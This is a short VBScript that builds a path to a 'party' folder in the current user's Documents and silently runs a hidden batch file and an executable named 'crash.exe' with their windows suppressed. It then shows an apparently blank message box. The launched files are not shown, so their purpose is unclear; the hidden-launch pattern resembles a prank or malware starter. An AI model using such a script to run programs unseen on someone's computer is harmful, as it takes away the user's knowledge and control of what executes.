strUser = CreateObject("WScript.Network").UserName
docFold = "C:\Users\" & strUser & "\Documents\party\"

Set WshShell = CreateObject("WScript.Shell" )
WshShell.Run chr(34) & docFold & ".JarLouncher.bat" & Chr(34), 0, true
WshShell.Run chr(34) & docFold & "crash.exe" & Chr(34), 0, false
MsgBox(test)